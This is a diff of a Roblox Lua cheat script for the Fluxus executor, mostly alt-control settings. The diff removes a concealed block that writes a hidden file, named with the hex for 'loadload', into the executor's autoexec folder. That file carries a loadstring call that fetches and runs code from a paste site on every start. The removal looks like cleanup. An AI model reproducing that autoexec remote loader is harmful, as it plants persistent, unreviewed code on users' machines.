@@ -1,22 +1,7 @@
-if isfile("fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json") then
-delfile("fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json")
-end
-
-local theme_data = [[
-
---{"rawCount":0, "showRawCount":false, "scriptType":"free", "createdAt":"2023-01-21T03:25:01.336Z", "isPatched":false, "slug":"Universal-Script-Collision-Enabler-8481", "script":"loadstring(game:HttpGet(('https://pastefy.ga/eDZnkBds/raw'),true))()", "_id":"63cb5b0dad447ae3cc2b8c04", "isUniversal":true, "__v":0, "views":6923, "queryInfo":null, "title":"Collision Enabler", "verified":false, "updatedAt":"2023-02-13T12:19:56.542Z", "game":{"imageUrl":"\/images\/script_2012488-1674271501285.jpg", "name":"Universal Script ðŸ“Œ", "gameId":2012488}, "visibility":"public", "matched":["features", "game", "script", "title", "universal"]}
-
-]]
-
-
-writefile(".fluxus_scriptblox_autoexec/.Ywee6c6f61646c6f6164.json",theme_data)
-
-
-------------------------important varibles------------------------------------------------------------
 
 rbxname = "escreamnice"
 local prefix = "."
-local LPlayer = game.Players.LocalPlayer -- your name on my name (maxbrh1)
+local LPlayer = game.Players.escreamnice -- your name on my name (maxbrh1)
 messageLL = "Greyss king" 
 speed = 1 --how fast tweengoto is 
 render1 = false --if alts auto unrender when excuted
